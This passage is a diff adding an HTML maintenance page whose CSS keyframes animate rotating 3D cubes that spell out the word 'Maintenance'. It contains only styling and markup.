@@ -1,0 +1,1556 @@
+<!DOCTYPE html>
+<html >
+	<head>
+	<meta charset="UTF-8">
+	<title>Maintenance</title>
+	<style>
+		body,
+		html {
+		position: relative;
+		overflow: hidden;
+		width: 100%;
+		height: 100%;
+		background-color: #433d3a;
+		background: radial-gradient(ellipse at center, #433d3a 25%, #322e2c 100%);
+		margin: 0;
+		font-family: Century Gothic, CenturyGothic, AppleGothic, sans-serif;
+		}
+		.f {
+		position: fixed;
+		bottom: 5px;
+		right: 15px;
+		font-family: 'Arial';
+		font-size: 0.7rem;
+		color: #f4f3d2;
+		text-align: center;
+		}
+		.f a {
+		font-size: 0.8rem;
+		color: #f1515c;
+		}
+		.sentence {
+		position: absolute;
+		top: 50%;
+		left: 50%;
+		transform: translate(-50%, -50%);
+		}
+		.word {
+		display: flex;
+		justify-content: center;
+		}
+		.container {
+		padding: 50px;
+		}
+		.cube {
+		transform-origin: 50% 50%;
+		transform-style: preserve-3d;
+		}
+		.side {
+		position: absolute;
+		width: 50px;
+		height: 50px;
+		margin: -25px;
+		}
+		.side1 {
+		transform: translateZ(25px);
+		}
+		.side2 {
+		transform: rotateY(90deg) translateZ(25px);
+		}
+		.side3 {
+		transform: rotateY(180deg) translateZ(25px);
+		}
+		.side4 {
+		transform: rotateY(-90deg) translateZ(25px);
+		}
+		.side5 {
+		transform: rotateX(90deg) translateZ(25px);
+		}
+		.side6 {
+		transform: rotateX(-90deg) translateZ(25px);
+		}
+		.letter {
+		position: absolute;
+		top: 50%;
+		left: 50%;
+		transform: translate(-50%, -50%);
+		font-size: 2.1em;
+		font-weight: 600;
+		}
+		.container:nth-child(1) .cube {
+		animation: rotate0 2s infinite linear;
+		}
+		@-moz-keyframes rotate0 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate0 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate0 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate0 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(2) .cube {
+		animation: rotate1 2s infinite linear;
+		}
+		@-moz-keyframes rotate1 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate1 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate1 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate1 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(3) .cube {
+		animation: rotate2 2s infinite linear;
+		}
+		@-moz-keyframes rotate2 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate2 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate2 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate2 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(4) .cube {
+		animation: rotate3 2s infinite linear;
+		}
+		@-moz-keyframes rotate3 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate3 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate3 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate3 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(5) .cube {
+		animation: rotate4 2s infinite linear;
+		}
+		@-moz-keyframes rotate4 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate4 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate4 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate4 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(6) .cube {
+		animation: rotate5 2s infinite linear;
+		}
+		@-moz-keyframes rotate5 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate5 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate5 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate5 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(7) .cube {
+		animation: rotate6 2s infinite linear;
+		}
+		@-moz-keyframes rotate6 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate6 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate6 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate6 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(8) .cube {
+		animation: rotate7 2s infinite linear;
+		}
+		@-moz-keyframes rotate7 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate7 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate7 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate7 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(9) .cube {
+		animation: rotate8 2s infinite linear;
+		}
+		@-moz-keyframes rotate8 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate8 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate8 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate8 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(10) .cube {
+		animation: rotate9 2s infinite linear;
+		}
+		@-moz-keyframes rotate9 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate9 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate9 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate9 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(11) .cube {
+		animation: rotate10 2s infinite linear;
+		}
+		@-moz-keyframes rotate10 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate10 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate10 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate10 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(12) .cube {
+		animation: rotate11 2s infinite linear;
+		}
+		@-moz-keyframes rotate11 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate11 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate11 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate11 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(13) .cube {
+		animation: rotate12 2s infinite linear;
+		}
+		@-moz-keyframes rotate12 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate12 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate12 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate12 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(14) .cube {
+		animation: rotate13 2s infinite linear;
+		}
+		@-moz-keyframes rotate13 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate13 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate13 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate13 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(15) .cube {
+		animation: rotate14 2s infinite linear;
+		}
+		@-moz-keyframes rotate14 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate14 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate14 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate14 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(16) .cube {
+		animation: rotate15 2s infinite linear;
+		}
+		@-moz-keyframes rotate15 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate15 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate15 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate15 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(17) .cube {
+		animation: rotate16 2s infinite linear;
+		}
+		@-moz-keyframes rotate16 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate16 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate16 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate16 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(18) .cube {
+		animation: rotate17 2s infinite linear;
+		}
+		@-moz-keyframes rotate17 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate17 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate17 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate17 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(19) .cube {
+		animation: rotate18 2s infinite linear;
+		}
+		@-moz-keyframes rotate18 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate18 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate18 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate18 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(20) .cube {
+		animation: rotate19 2s infinite linear;
+		}
+		@-moz-keyframes rotate19 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate19 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate19 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate19 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(21) .cube {
+		animation: rotate20 2s infinite linear;
+		}
+		@-moz-keyframes rotate20 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate20 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate20 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate20 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(22) .cube {
+		animation: rotate21 2s infinite linear;
+		}
+		@-moz-keyframes rotate21 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate21 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate21 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate21 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(23) .cube {
+		animation: rotate22 2s infinite linear;
+		}
+		@-moz-keyframes rotate22 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate22 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate22 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate22 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(24) .cube {
+		animation: rotate23 2s infinite linear;
+		}
+		@-moz-keyframes rotate23 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate23 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate23 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate23 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(0deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(25) .cube {
+		animation: rotate24 2s infinite linear;
+		}
+		@-moz-keyframes rotate24 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-webkit-keyframes rotate24 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@-o-keyframes rotate24 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		@keyframes rotate24 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(-360deg);
+		}
+		}
+		.container:nth-child(26) .cube {
+		animation: rotate25 2s infinite linear;
+		}
+		@-moz-keyframes rotate25 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate25 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate25 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate25 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(27) .cube {
+		animation: rotate26 2s infinite linear;
+		}
+		@-moz-keyframes rotate26 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate26 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate26 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate26 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		.container:nth-child(28) .cube {
+		animation: rotate27 2s infinite linear;
+		}
+		@-moz-keyframes rotate27 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate27 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate27 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate27 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(29) .cube {
+		animation: rotate28 2s infinite linear;
+		}
+		@-moz-keyframes rotate28 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate28 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate28 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate28 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(-360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(30) .cube {
+		animation: rotate29 2s infinite linear;
+		}
+		@-moz-keyframes rotate29 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-webkit-keyframes rotate29 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@-o-keyframes rotate29 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		@keyframes rotate29 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(0deg);
+		}
+		}
+		.container:nth-child(31) .cube {
+		animation: rotate30 2s infinite linear;
+		}
+		@-moz-keyframes rotate30 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@-webkit-keyframes rotate30 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@-o-keyframes rotate30 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+		@keyframes rotate30 {
+		0% {
+		transform: rotateX(0deg) rotateY(0deg);
+		}
+		100% {
+		transform: rotateX(360deg) rotateY(360deg);
+		}
+		}
+	</style>
+	</head>
+	<body translate="no" >
+		<!-- Inspiration-->
+		<!-- https://vimeo.com/145254398-->
+		<div class="sentence">
+			<div class="word">
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">M</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">M</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">M</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">M</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">M</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">M</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">A</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">I</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">N</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">T</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">E</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">N</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">A</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">A</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
